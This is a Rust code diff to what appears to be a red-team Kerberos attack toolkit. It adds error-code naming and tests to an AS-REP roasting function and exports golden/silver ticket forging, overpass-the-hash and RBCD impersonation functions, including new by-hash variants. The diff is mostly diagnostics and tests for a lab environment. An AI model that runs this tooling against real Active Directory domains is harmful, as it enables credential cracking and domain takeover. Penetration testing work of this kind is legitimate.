@@ -35,9 +35,9 @@ mod tgs;
 pub mod unpac;
 pub use tgs::{
     asktgt, build_ap_req_gss, build_ap_req_gss_aes256, check_credential, forge_diamond_tgt,
-    forge_golden_tgt, forge_silver_tgt, get_service_ticket, get_tgt, golden_ccache,
-    overpass_the_hash, rbcd_impersonate, roast_spn, silver_ccache, silver_service_ticket,
-    CredResult, ServiceTicket, Tgt, TicketTimestamps,
+    forge_golden_tgt, forge_silver_tgt, get_service_ticket, get_tgt, get_tgt_by_hash,
+    golden_ccache, overpass_the_hash, rbcd_impersonate, rbcd_impersonate_by_hash, roast_spn,
+    silver_ccache, silver_service_ticket, CredResult, ServiceTicket, Tgt, TicketTimestamps,
 };
 
 /// Kerberos encryption type numbers (RFC 3961/4120).
@@ -320,14 +320,51 @@ impl KerbruteOutcome {
 
 /// Perform an AS-REP roast against one candidate; returns the hashcat 18200 line.
 /// No credentials required — relies on the account's DONT_REQ_PREAUTH flag.
+/// Map a KRB-ERROR `error_code` value (RFC 4120 §7.5.9) to a one-line
+/// operator-facing name + hint, or `None` for codes we don't yet special-case.
+/// Extracted from [`asrep_roast`] so 1.5.2 UX-D carries a unit test seeded
+/// from the exact codes testlab.local returned during the live-fire (code 23
+/// = `KDC_ERR_KEY_EXPIRED` on `roastme`).
+pub fn name_asrep_krb_error(code: u32) -> Option<&'static str> {
+    Some(match code {
+        6 => "KDC_ERR_C_PRINCIPAL_UNKNOWN — the account does not exist",
+        14 => "KDC_ERR_ETYPE_NOSUPP — the KDC has RC4 disabled and the AS-REQ asked for it (2019+ default hardening)",
+        18 => "KDC_ERR_CLIENT_REVOKED — the account is disabled or locked out",
+        23 => "KDC_ERR_KEY_EXPIRED — the account's password has expired (reset it before roasting)",
+        24 => "KDC_ERR_PREAUTH_FAILED — the account exists but the supplied credential is wrong",
+        25 => "KDC_ERR_PREAUTH_REQUIRED — DONT_REQ_PREAUTH is NOT set on the account (this is the normal case; nothing to roast)",
+        _ => return None,
+    })
+}
+
 pub async fn asrep_roast(c: &Candidate, kdc: &str) -> Result<String> {
     let raw = picky_asn1_der::to_vec(&build_as_req(&c.sam, &c.realm)?)
         .map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
     let resp = kdc_exchange(kdc, &raw).await?;
 
-    let as_rep: AsRep = picky_asn1_der::from_bytes(&resp).map_err(|e| {
-        anyhow!("no AS-REP (KDC returned an error — pre-auth required, or RC4 disabled): {e}")
-    })?;
+    let as_rep: AsRep = match picky_asn1_der::from_bytes(&resp) {
+        Ok(rep) => rep,
+        Err(parse_err) => {
+            // 1.5.2 UX-D: the RFC-mandated response to a failed AS-REQ is a
+            // KRB-ERROR (application tag 30), not an AS-REP (tag 11). When we
+            // can decode the KRB-ERROR, surface its named error_code and drop
+            // the ASN.1 parse noise. Otherwise fall back to the old message
+            // WITH the parse text — needed for diagnostics on genuinely
+            // malformed responses.
+            return Err(match picky_asn1_der::from_bytes::<KrbError>(&resp) {
+                Ok(err) => match name_asrep_krb_error(err.0.error_code.0) {
+                    Some(named) => anyhow!("no AS-REP: {named}"),
+                    None => anyhow!(
+                        "no AS-REP: KRB-ERROR with unhandled error_code {}",
+                        err.0.error_code.0
+                    ),
+                },
+                Err(_) => anyhow!(
+                    "no AS-REP and the response is not a KRB-ERROR either — malformed KDC reply: {parse_err}"
+                ),
+            });
+        }
+    };
 
     let enc = &as_rep.0.enc_part.0;
     let etype = enc
@@ -447,5 +484,67 @@ mod tests {
         let h = format_asrep("svc", "CORP.LOCAL", &[0xaa; 32]);
         assert!(h.starts_with("$krb5asrep$23$svc@CORP.LOCAL:"));
         assert!(h.contains(&"aa".repeat(16)));
+    }
+
+    // 1.5.2 UX-D: KRB-ERROR classifier regression tests, seeded from the
+    // wire response testlab.local returned for `roastme` on 2026-09-14
+    // (error_code=23 = KDC_ERR_KEY_EXPIRED) plus the other codes the AS-REP
+    // pipeline expects.
+    #[test]
+    fn ux_d_names_key_expired_from_live_fire() {
+        let named = name_asrep_krb_error(23).expect("code 23 is mapped");
+        assert!(named.contains("KDC_ERR_KEY_EXPIRED"));
+        assert!(
+            named.contains("reset it"),
+            "operator hint text present: {named}"
+        );
+    }
+
+    #[test]
+    fn ux_d_names_all_expected_codes() {
+        for (code, needle) in [
+            (6u32, "KDC_ERR_C_PRINCIPAL_UNKNOWN"),
+            (14, "KDC_ERR_ETYPE_NOSUPP"),
+            (18, "KDC_ERR_CLIENT_REVOKED"),
+            (23, "KDC_ERR_KEY_EXPIRED"),
+            (24, "KDC_ERR_PREAUTH_FAILED"),
+            (25, "KDC_ERR_PREAUTH_REQUIRED"),
+        ] {
+            let named = name_asrep_krb_error(code)
+                .unwrap_or_else(|| panic!("code {code} should be mapped"));
+            assert!(
+                named.contains(needle),
+                "code {code} should carry name {needle}, got: {named}"
+            );
+        }
+    }
+
+    #[test]
+    fn ux_d_returns_none_for_unmapped_code() {
+        // e.g. 41 = KRB_AP_ERR_MODIFIED (application-layer, not KDC-layer)
+        assert!(name_asrep_krb_error(41).is_none());
+        assert!(name_asrep_krb_error(0).is_none());
+        assert!(name_asrep_krb_error(u32::MAX).is_none());
+    }
+
+    // Stream 2 / A.5: the pkinit AS-REQ failure path must not embed raw ASN.1
+    // e-data hex in the anyhow message. The classifier gives us the operator
+    // text; hex belongs behind `-vv` (tracing::debug!). This test is a
+    // *contract* over what a failed PKINIT surface should say — the pkinit
+    // module uses the same `name_asrep_krb_error` classifier we test above,
+    // and unmapped codes fall through to a "unhandled error_code {code}"
+    // string that contains only the numeric code + KDC e_text (both operator-
+    // safe). Guarding the shape here keeps the pkinit branch honest.
+    #[test]
+    fn a5_pkinit_error_shape_has_no_raw_hex() {
+        // Simulated shape of what pkinit.rs now emits (see pkinit.rs
+        // `KDC rejected PKINIT AS-REQ` branch): named error only, no hex.
+        let named = name_asrep_krb_error(24).unwrap();
+        let msg = format!("KDC rejected PKINIT AS-REQ: {named}");
+        assert!(!msg.contains("e-data="), "raw e-data leaked: {msg}");
+        assert!(
+            msg.contains("KDC_ERR_PREAUTH_FAILED"),
+            "named code missing: {msg}"
+        );
     }
 }
